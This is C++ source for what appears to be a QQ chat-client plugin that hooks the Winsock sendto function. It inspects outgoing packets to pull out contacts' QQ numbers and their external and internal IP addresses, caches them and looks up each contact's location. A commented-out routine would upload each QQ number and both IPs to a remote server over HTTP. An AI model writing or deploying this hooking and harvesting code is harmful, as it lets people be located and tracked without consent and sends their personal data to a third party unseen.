#include "ipquery.h"
struct in_addr WanIP;

struct MYPARAM
{
    unsigned long qquin;
    unsigned long wanip;
    unsigned long lanip;
};
/*
void PostCacheIPToNet(PVOID pvoid)
{
    char szKey[128];
    MYPARAM *tmp = (MYPARAM *)pvoid;
    if(!SafeGetKey(szKey))//Util::Contact::IsStranger(tmp->qquin) || 
    {
        free(pvoid);
        return;
    }
    
    char *key = Calculate(szKey);
    char frmdata[1024];
    wsprintfA(frmdata, "http://%s/?m=%d&k=%s%s&id=%08X&ip1=%08X&ip2=%08X", CWUB_SERVE,1, szKey, key, tmp->qquin, tmp->wanip, tmp->lanip);
    //OutputDebugStringA(frmdata);
    free(key);
    
    HINTERNET hSession = InternetOpenA(USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if(hSession!=NULL)
    {
        HINTERNET hConnect = InternetOpenUrlA(hSession,frmdata,NULL,0,INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE,0);
        if(hConnect!=NULL)
        {
            BYTE buffer[1024];
            DWORD DataReadLength = 0;
            
            SetWininetTimeout(hConnect);
            InternetReadFile(hConnect,buffer,1023,&DataReadLength);
            
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hSession);
    }
    
    free(pvoid);
    //isrun = false;
}
*/
void _stdcall IPdetection(const sockaddr* sendto,BYTE *buffer,int bufLen)
{
    sockaddr_in *mys = (sockaddr_in*)sendto;
	short port = mys->sin_port;

	_asm
	{
		mov ax, port;
		xchg al, ah;
		mov port, ax;
	}

    if(port!=8000 && port!=9001) //排除与服务器的连接
    {
        if(bufLen==27 && buffer[0]==0x03) // && buffer[18]==0x6b
        {
            //确保路径存在
            //mrdir();

            //获得QQ号码
            unsigned long QQUIN;
            QQUIN = *(DWORD*)(&buffer[23]);
			//QQUIN = SWAP32(QQUIN);
			

            _asm
            {
                mov     eax,QQUIN
                bswap   eax
                mov     QQUIN,eax
            }
			
            //
            //GET_DWORD(&buffer[23],&QQUIN);
			//DbgPrint(L"%X",QQUIN);
            if( QQUIN<10000 || QQUIN==0x7FFFFFFF || Util::Contact::GetIMVersion(QQUIN)==0 ) return;

            TCHAR MYQQ[256];
            wsprintf(MYQQ, _T("%X"), QQUIN);

            //获得IP
            TCHAR Temp[256];
            
            TCHAR tzTime[256];
            GetTime(QQUIN, tzTime);

            SYSTEMTIME SystemTime;
            GetLocalTime(&SystemTime);
            wsprintf(Temp,_T("%04d%02d%02d"), SystemTime.wYear, SystemTime.wMonth, SystemTime.wDay);
            if (wcscmp(tzTime, Temp) != 0)
            {
                WritePrivateProfileString(_T("WAN"), MYQQ, NULL, tzCachePath);
                WritePrivateProfileString(_T("TIME"), MYQQ, Temp, tzCachePath);
            }
            
            //写入缓存
            wsprintf(tzTime, _T("%S"), inet_ntoa(mys->sin_addr));
            if(GetPrivateProfileString(_T("WAN"), MYQQ, L"", Temp, 255, tzCachePath)==0 || wcscmp(tzTime,Temp)!=0)
            {
                wsprintf(Temp, _T("%S"), inet_ntoa(mys->sin_addr));
                WritePrivateProfileString(_T("WAN"), MYQQ, Temp, tzCachePath);
                 //多线程查询IP最终所在地
                QueryIPAddress(QQUIN);
				/*
                MYPARAM *tmp = (MYPARAM*)malloc(sizeof(MYPARAM));
                tmp->qquin = QQUIN;
                tmp->wanip = mys->sin_addr.s_addr;
                tmp->lanip = WanIP.s_addr;
                _beginthread(PostCacheIPToNet, 0, (LPVOID)tmp);
                */
                if(WanIP.s_addr!=0) WritePrivateProfileString(_T("LAN"), MYQQ, NULL, tzCachePath);
            }
            
            //写入内网
            if(WanIP.s_addr!=0 && WanIP.s_addr!=mys->sin_addr.s_addr)
            {
                if(GetPrivateProfileString(_T("LAN"), MYQQ, L"", Temp, 255, tzCachePath)==0)
                {
                    wsprintf(Temp,_T("%S"),inet_ntoa(WanIP));
                    WritePrivateProfileString(_T("LAN"), MYQQ, Temp, tzCachePath);
                    
                    
                    WanIP.s_addr = 0;
                }
            }
        }
        else
        {
            //内网探测缓存
            if(buffer[0]==0x00 && (bufLen==1 || bufLen==84 ))
            {
                if(mys->sin_addr.s_addr!=0) WanIP = mys->sin_addr;
            }
        }
    }
}

typedef int (__stdcall * SENDTO) (SOCKET, BYTE*,int, int, const sockaddr* , int );
SENDTO SendtoOldProc = NULL;
int WINAPI MySendto(SOCKET s, BYTE* buf,int len, int flags, const sockaddr* to, int tolen)
{
    IPdetection(to,buf,len);
    //调用原来的函数，发送数据
    
    if(SendtoOldProc) return SendtoOldProc(s,buf,len,flags,to,tolen);
    
    return 0;
}



void ipprobe()
{
    SendtoOldProc = (SENDTO)InstallHook((DWORD)WS2_32.GetFunc("sendto"),(DWORD)MySendto);
}